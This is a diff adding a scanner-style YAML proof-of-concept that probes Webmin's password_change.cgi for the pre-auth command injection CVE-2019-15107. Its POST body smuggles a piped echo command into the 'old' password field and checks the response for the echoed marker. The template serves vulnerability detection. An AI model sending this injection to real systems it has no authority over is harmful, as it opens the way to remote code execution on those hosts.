@@ -1,0 +1,17 @@
+name: poc-webmin-rce
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/password_change.cgi"
+      body: "user=root&pam=&expired=2&old=test%7cecho%20{{r0}}%3a%3a&new1=test&new2=test"
+    expression: response.status == 200 && (response.body.bcontains("{{r0}}::") || response.body.bcontains("Password changing is not allowed"))
+expression: r0()
+detail:
+  author: sxel
+  description: Webmin password_change.cgi command injection probe (CVE-2019-15107, pre-auth RCE on affected versions)
+  severity: critical
+  tags: webmin,rce,cmdi
